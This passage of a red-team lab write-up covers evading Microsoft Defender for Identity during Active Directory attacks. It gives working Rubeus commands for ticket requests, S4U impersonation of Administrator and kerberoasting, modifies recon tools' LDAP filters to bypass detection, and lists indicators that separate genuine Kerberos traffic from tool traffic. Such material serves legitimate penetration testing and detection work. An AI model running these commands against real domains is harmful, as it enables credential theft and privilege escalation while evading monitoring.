+- Retrieves all objects (<code>objectGuid=*</code>) then processes them locally.
+- Limited LDAP queries - less chance of endpoint detection.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Build a cache with basic info about domain objects</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>SOAPHound.exe<span class="w"> </span>--buildcache<span class="w"> </span>-c<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\v</span>agrant<span class="se">\d</span>esktop<span class="se">\c</span>ache.txt
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Collect BloodHound-compatible data</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>SOAPHound.exe<span class="w"> </span>-c<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\v</span>agrant<span class="se">\d</span>esktop<span class="se">\c</span>ache.txt<span class="w"> </span>--bhdump<span class="w"> </span>-o<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\v</span>agrant<span class="se">\d</span>esktop<span class="se">\b</span>loodhound-output<span class="w"> </span>--nolaps
+</code></pre></div>
+<p><strong>MDI detection:</strong> MDI detected the original SOAPHound due to the LDAP filter <code>(!soaphound=*)</code>.</p>
+<p><img alt="" src="img/Pasted%20image%2020260417134217.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421170602.png" /></p>
+<p>The filter is hardcoded in the source:</p>
+<p><img alt="" src="img/Pasted%20image%2020260417145354.png" /></p>
+<p>After modifying <code>(!soaphound=*)</code> in the source and recompiling, SOAPHound bypasses MDI:</p>
+<p><img alt="" src="img/Pasted%20image%2020260417145713.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421171341.png" /></p>
+<p><strong>Drawbacks:</strong>
+- Requires introducing a binary to monitored endpoints.
+- May fail against very large domains.</p>
+<h5 id="shadowhound-adm">ShadowHound-ADM</h5>
+<p><a href="https://github.com/Friends-Security/ShadowHound/blob/main/ShadowHound-ADM.ps1">ShadowHound-ADM</a> is a PowerShell script leveraging the AD Module over ADWS.
+- Uses native PowerShell - no need for known-malicious binaries like SharpHound.
+- Talks to ADWS (Port 9389) instead of LDAP.</p>
+<p><img alt="" src="img/Pasted%20image%2020260421175443.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># AD Recon</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Import-Module<span class="w"> </span>.<span class="se">\S</span>hadowHound-ADM.ps1
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>ShadowHound-ADM<span class="w"> </span>-OutputFilePath<span class="w"> </span><span class="s2">"C:\users\consultant\documents\mhd\ldap_output.txt"</span><span class="w"> </span>-SplitSearch<span class="w"> </span>-LetterSplitSearch<span class="w"> </span>-Recurse
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># ADCS Recon</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>ShadowHound-ADM<span class="w"> </span>-OutputFilePath<span class="w"> </span><span class="s2">"C:\users\consultant\documents\mhd\cert_output.txt"</span><span class="w"> </span>-Certificates
+</code></pre></div>
+<p><strong>MDI detection:</strong> Detected due to specific LDAP filters in the original code.</p>
+<p>For AD Recon:</p>
+<p><img alt="" src="img/Pasted%20image%2020260420111459.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421180249.png" /></p>
+<p>For ADCS Recon:</p>
+<p><img alt="" src="img/Pasted%20image%2020260421180720.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421180754.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421181527.png" /></p>
+<p>After modifying the filters in the source, ShadowHound-ADM bypasses MDI:</p>
+<p><img alt="" src="img/Pasted%20image%2020260420111907.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260420132551.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260420113302.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260420113345.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260420113541.png" /></p>
+<p><strong>Convert outputs to BloodHound JSON:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Setup venv</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>python<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.venv
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">source</span><span class="w"> </span>.venv/bin/activate
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>pip3<span class="w"> </span>install<span class="w"> </span>bofhound
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c1"># Convert</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>bofhound<span class="w"> </span>-i<span class="w"> </span>~/workspace/ldap_output.txt<span class="w"> </span>-p<span class="w"> </span>All<span class="w"> </span>--parser<span class="w"> </span>ldapsearch
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>bofhound<span class="w"> </span>-i<span class="w"> </span>~/workspace/certs_output.txt<span class="w"> </span>-p<span class="w"> </span>All<span class="w"> </span>--parser<span class="w"> </span>ldapsearch
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260422103701.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260422110128.png" /></p>
+<hr />
+<h3 id="kerberos-requests-opsec">Kerberos Requests OPSEC</h3>
+<h4 id="as-req">AS-REQ</h4>
+<p><strong>Detection indicators - Rubeus vs Genuine:</strong></p>
+<p>Genuine AS-REQ always sends a first request <strong>without</strong> pre-authentication, then a second one with it.</p>
+<p><img alt="" src="img/ASREQGenuine.png" /></p>
+<p>Rubeus skips the first unauthenticated AS-REQ:</p>
+<p><img alt="" src="img/ASREQRubeus.png" /></p>
+<p><strong>Encryption type:</strong> Genuine traffic uses AES256 (etype 18). Tools default to RC4 (etype 23) - the most obvious indicator.</p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Rubeus</th>
+<th>Genuine</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>First unauthenticated AS-REQ</td>
+<td>Missing</td>
+<td>Present</td>
+</tr>
+<tr>
+<td>Encryption type</td>
+<td>RC4 (23)</td>
+<td>AES256 (18)</td>
+</tr>
+<tr>
+<td><code>canonicalize</code> bit</td>
+<td>Disabled</td>
+<td>Enabled</td>
+</tr>
+<tr>
+<td>Supported etypes count</td>
+<td>&lt; 6</td>
+<td>6</td>
+</tr>
+<tr>
+<td><code>rtime</code> (renew time) field</td>
+<td>Missing</td>
+<td>Present</td>
+</tr>
+<tr>
+<td><code>addresses</code> field</td>
+<td>Missing</td>
+<td>Present</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="" src="img/ASREQRubeus1.png" /></p>
+<p><img alt="" src="img/ASREQGenuine1.png" /></p>
+<p><img alt="" src="img/ASREQGenuineVsRubeus.png" /></p>
+<p><img alt="" src="img/CanonicalizeFalse.png" /></p>
+<p><img alt="" src="img/ASREQGenuineVsRubeus1.png" /></p>
+<p><strong>MDI Alerts:</strong></p>
+<p><img alt="" src="img/Pasted%20image%2020260416100707.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260416162925.png" /></p>
+<h5 id="emulate-a-genuine-as-req">Emulate a Genuine AS-REQ</h5>
+<ul>
+<li>Send a first unauthenticated AS-REQ, then a second one with <code>PA-ENC-TIMESTAMP, PA-DATA</code> encrypted with AES256.</li>
+<li>Enable <code>canonicalize</code> in KDC options.</li>
+<li>Include all 6 supported etypes.</li>
+<li>Include <code>rtime</code> and <code>addresses</code> fields.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># OPSEC-friendly</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/aes256:05B2FCE16C6564D6A8XXXX7C72D5090D9CC3F66FC4F5E376FD8EBB76B8D0<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Less OPSEC (MDI may detect - undetected in lab)</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/rc4:F894F8DBEXXXX0421B73202F4A5160D<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt<span class="w"> </span>/force
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># Detected by MDI</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/rc4:F894F8DBE06XXXXX73202F4A5160D
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/aes256:05B2FCE16C6564D6A8XXXXXXC72D5090D9CC3F66FC4F5E376FD8EBB76B8D0
+</code></pre></div>
+<hr />
+<h4 id="tgs-req">TGS-REQ</h4>
+<p>Genuine logins always request several service tickets: <code>host</code>, <code>ldap</code>, <code>cifs</code>.</p>
+<p><img alt="" src="img/SeveralTGSReq.png" /></p>
+<p><strong>Detection indicators - Rubeus vs Genuine:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Rubeus</th>
+<th>Genuine</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PA PAC OPTIONS</code> field</td>
+<td>Missing</td>
+<td>Present</td>
+</tr>
+<tr>
+<td><code>canonicalize</code> bit</td>
+<td>Disabled</td>
+<td>Enabled</td>
+</tr>
+<tr>
+<td>Supported etypes count</td>
+<td>&lt; 5</td>
+<td>5</td>
+</tr>
+<tr>
+<td><code>cname</code> field</td>
+<td>Included</td>
+<td>Absent</td>
+</tr>
+<tr>
+<td><code>till</code> field</td>
+<td>Incorrect</td>
+<td>Proper</td>
+</tr>
+<tr>
+<td><code>enc-authorization-data</code></td>
+<td>Missing</td>
+<td>Present</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="" src="img/TGSREQGenuineVsRubeus.png" /></p>
+<p><strong>MDI Alert:</strong></p>
+<p><img alt="" src="img/Pasted%20image%2020260416172342.png" /></p>
+<p>For the Authenticator (cksum, cusec, seq number): unlikely to be monitored as decrypting all authenticators on the fly would impose massive overhead.</p>
+<p><img alt="" src="img/AuthenticatorGenuinsVsRubeus.png" /></p>
+<p><img alt="" src="img/TGSREQGenuineVsTools.png" /></p>
+<p><strong>Unconstrained delegation:</strong> When requesting a TGS for a service with unconstrained delegation, the TGS-REP sets the <code>ok-as-delegate</code> bit, triggering a second TGS-REQ for <code>krbtgt/domain.com</code> to get a forwardable TGT.</p>
+<p><img alt="" src="img/TGSRepUnc.png" /></p>
+<p><img alt="" src="img/TGS-REQForForwardable.png" /></p>
+<p>To emulate genuine traffic, also issue a TGS-REQ for <code>krbtgt/domain.com</code>.</p>
+<p><img alt="" src="img/OPSECUnconstrainedDelegationRubeus.png" /></p>
+<h5 id="emulate-a-genuine-tgs-req">Emulate a Genuine TGS-REQ</h5>
+<ul>
+<li>Use AES256 encryption.</li>
+<li>Include <code>PA PAC OPTIONS</code> field.</li>
+<li>Enable <code>canonicalize</code> in KDC options.</li>
+<li>Include all 5 supported etypes.</li>
+<li>Remove the <code>cname</code> field.</li>
+<li>Set a proper <code>till</code> field.</li>
+<li>Include <code>enc-authorization-data</code>.</li>
+<li>Request multiple service tickets (<code>ldap</code>, <code>host</code>, <code>cifs</code>).</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># OPSEC-friendly (with existing TGT)</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Rubeus.exe<span class="w"> </span>asktgs<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:Administrator<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/service:ldap/dc01.yhp0w.lan,host/dc01.yhp0w.lan,cifs/dc01.yhp0w.lan<span class="w"> </span>/nowrap<span class="w"> </span>/ptt<span class="w"> </span>/ticket:doIFcjCCBW6gAwIBBaEDAgEWooIEYz.............................xPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNTRVZFTktJTkdET01
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># Detected by MDI</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Rubeus.exe<span class="w"> </span>asktgs<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/service:ldap/dc01.yhp0w.lan,http/dc01.yhp0w.lan,host/dc01.yhp0w.lan,cifs/dc01.yhp0w.lan<span class="w"> </span>/nowrap<span class="w"> </span>/ticket:doIFcjCCBW6gAwIBBaEDAgEWooIEYz.............................xPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNTRVZFTktJTkdET01
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c1"># OPSEC one-shot AS-REQ + TGS-REQ (x3)</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>Rubeus.exe<span class="w"> </span>asktgs<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/aes256:05B2FCE16C6564D6A8B07B6EC67C72XXXXXXXXXXF5E376FD8EBB76B8D0<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/service:ldap/dc01.yhp0w.lan,host/dc01.yhp0w.lan,cifs/dc01.yhp0w.lan<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="c1"># TGT Renew (based on a TGT from an OPSEC AS-REQ)</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>Rubeus.exe<span class="w"> </span>renew<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:mhd<span class="w"> </span>/enctype:aes256<span class="w"> </span>/nowrap<span class="w"> </span>/ptt<span class="w"> </span>/ticket:........
+</code></pre></div>
+<hr />
+<h4 id="s4u2self">S4U2Self</h4>
+<p>Difference between genuine and Rubeus S4U2Self requests:</p>
+<p><img alt="" src="img/Pasted%20image%2020260127114724.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260122101841.png" /></p>
+<h5 id="emulate-a-genuine-s4u2self-tgs-req">Emulate a Genuine S4U2Self TGS-REQ</h5>
+<ul>
+<li>Include <code>PA-S4U-X509-USER</code>.</li>
+<li>Enable <code>canonicalize</code> in KDC options.</li>
+<li>Include all 5 supported etypes.</li>
+<li>Remove the <code>cname</code> field.</li>
+<li>Set a proper <code>till</code> field (<code>+15min</code>, not Sept 2037).</li>
+<li>Use correct PA username name-type: <code>Enterprise-PRINCIPAL</code> (not NT Principal).</li>
+<li>Use correct sname name-type: <code>NT Principal</code>.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># OPSEC-friendly</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/self<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:svc_mhd<span class="w"> </span>/aes256:05B2FCE16C6564D6A8B07BXXXXXXXX3F66FC4F5E376FD8EBB76B8D0<span class="w"> </span>/impersonateuser:Administrator<span class="w"> </span>/altservice:svc/srv01.yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># Less OPSEC (MDI may detect - undetected in lab)</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/self<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:svc_mhd<span class="w"> </span>/rc4:F894F8DBE0XXXXXX3202F4A5160D<span class="w"> </span>/impersonateuser:Administrator<span class="w"> </span>/altservice:svc/srv01.yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260420170711.png" /></p>
+<hr />
+<h4 id="s4u2proxy">S4U2Proxy</h4>
+<p>Difference between genuine and Rubeus S4U2Proxy requests:</p>
+<p><img alt="" src="img/GenuineVsRubeusS4u2proxy.png" /></p>
+<p><img alt="" src="img/GenuineVsToolsS4u2proxy.png" /></p>
+<h5 id="emulate-a-genuine-s4u2proxy-tgs-req">Emulate a Genuine S4U2Proxy TGS-REQ</h5>
+<ul>
+<li>Include <code>PA-PAC-OPTIONS</code>.</li>
+<li>Enable <code>canonicalize</code> in KDC options.</li>
+<li>Include all 5 supported etypes.</li>
+<li>Remove the <code>cname</code> field.</li>
+<li>Set a proper <code>till</code> field (<code>+15min</code>).</li>
+<li>Include <code>enc-authorization-data</code>.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># OPSEC-friendly</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:svc_mhd<span class="w"> </span>/aes256:05B2FCE16C6564D6A8BXXXXXXXXXXXXXC3F66FC4F5E376FD8EBB76B8D0<span class="w"> </span>/impersonateuser:Administrator<span class="w"> </span>/msdsspn:svc2/srv01.yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># Less OPSEC (MDI may detect - undetected in lab)</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>Rubeus.exe<span class="w"> </span>createnetonly<span class="w"> </span>/program:C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe<span class="w"> </span>/show
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/domain:yhp0w.lan<span class="w"> </span>/dc:dc01.yhp0w.lan<span class="w"> </span>/user:svc_mhd<span class="w"> </span>/rc4:F894F8DBE06D4XXXXXXX202F4A5160D<span class="w"> </span>/impersonateuser:Administrator<span class="w"> </span>/msdsspn:svc2/srv01.yhp0w.lan<span class="w"> </span>/enctype:aes256<span class="w"> </span>/opsec<span class="w"> </span>/nowrap<span class="w"> </span>/ptt
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260420170808.png" /></p>
+<hr />
+<h3 id="kerberoasting-opsec">Kerberoasting OPSEC</h3>
+<h4 id="mdi-detections">MDI Detections</h4>
+<p>MDI detects:
+- Encryption downgrade to RC4_HMAC (etype 0x17)
+- Reconnaissance for kerberoastable accounts (LDAP query for users with SPN)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Detected by MDI - LDAP recon</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Get-DomainUser<span class="w"> </span>-SPN
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Rubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/stats
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Detected by MDI - LDAP recon + encryption downgrade</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>Rubeus.exe<span class="w"> </span>kerberoast
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>Rubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/user:svc_mhd<span class="w"> </span>/simple<span class="w"> </span>/rc4opsec
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260416174948.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260416164907.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260416112644.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260416112942.png" /></p>
+<h4 id="opsec-approach">OPSEC Approach</h4>
+<ul>
+<li>Fetch <strong>all users</strong> without filtering by SPN, then identify kerberoastable accounts offline.</li>
+<li>Only kerberoast accounts that do <strong>not</strong> support AES (to avoid encryption downgrade alerts).</li>
+<li>Request one TGS ticket at a time.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># OPSEC recon - no SPN filter</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Get-DomainUser<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span>samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># OPSEC kerberoasting - specify SPNs explicitly, one at a time</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Rubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/spn:SVC2<span class="se">\s</span>rv01.yhp0w.lan<span class="w"> </span>/simple<span class="w"> </span>/nowrap<span class="w"> </span>/rc4opsec
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>Rubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/spns:c:/users/consultant/documents/mhd/spns.txt<span class="w"> </span>/simple<span class="w"> </span>/nowrap<span class="w"> </span>/rc4opsec
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260416160418.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260420174243.png" /></p>
+<h4 id="targeted-kerberoasting-genericwrite">Targeted Kerberoasting (GenericWrite)</h4>
+<p>MDI does <strong>not</strong> detect modification of <code>ServicePrincipalName</code> or <code>msDS-SupportedEncryptionTypes</code> attributes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Downgrade supported encryption to RC4</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Set-DomainObject<span class="w"> </span>-Identity<span class="w"> </span>svc_mhd2<span class="w"> </span>-Set<span class="w"> </span>@<span class="o">{</span><span class="s1">'msDS-SupportedEncryptionTypes'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="o">}</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># Add a fake SPN if none exists</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Set-DomainObject<span class="w"> </span>-Identity<span class="w"> </span>svc_mhd2<span class="w"> </span>-Set<span class="w"> </span>@<span class="o">{</span><span class="s1">'servicePrincipalName'</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http/fake'</span><span class="o">}</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="c1"># Kerberoast</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Rubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/spn:http/fake<span class="w"> </span>/simple<span class="w"> </span>/nowrap<span class="w"> </span>/rc4opsec
+</code></pre></div>
+<p><img alt="" src="img/Pasted%20image%2020260423093633.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260423093713.png" /></p>
+<hr />
+<h3 id="identity-attack-paths">Identity Attack Paths</h3>
+<blockquote>
+<p>These attack paths are detected by MDI. No reliable bypass has been identified.</p>
+</blockquote>
+<h4 id="entra-connect-interactive-logon">Entra Connect Interactive Logon</h4>
+<p>MDI detects interactive logon to the Entra Connect server.</p>
+<p><img alt="" src="img/Pasted%20image%2020260424143259.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260424143306.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260423182017.png" /></p>
